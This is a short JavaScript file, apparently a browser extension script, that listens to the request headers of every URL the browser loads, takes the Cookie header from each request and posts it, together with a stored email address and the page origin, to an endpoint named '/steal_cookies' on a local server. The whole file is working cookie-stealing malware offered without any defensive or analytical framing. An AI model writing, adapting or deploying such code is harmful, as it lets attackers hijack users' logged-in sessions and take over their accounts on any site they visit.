

chrome.storage.local.get('email', function (result) {
    var userEmail = result.email;
    chrome.webRequest.onBeforeSendHeaders.addListener(
        function (details) {
            if (!(typeof details.requestHeaders === 'undefined')) {
                for (var i = 0; i < details.requestHeaders.length; ++i) {
                    if (details.requestHeaders[i].name == 'Cookie') {
                        // console.log(details.requestHeaders[i]);
    
                        $.post("http://localhost:5000/steal_cookies", {
                            email: userEmail,
                            url: window.location.origin,
                            cookies: details.requestHeaders[i].value
                        });
    
                    }
                }
            }
            return { requestHeaders: details.requestHeaders };
        },
        { urls: ["<all_urls>"] },
        ["blocking", "requestHeaders"]);
});
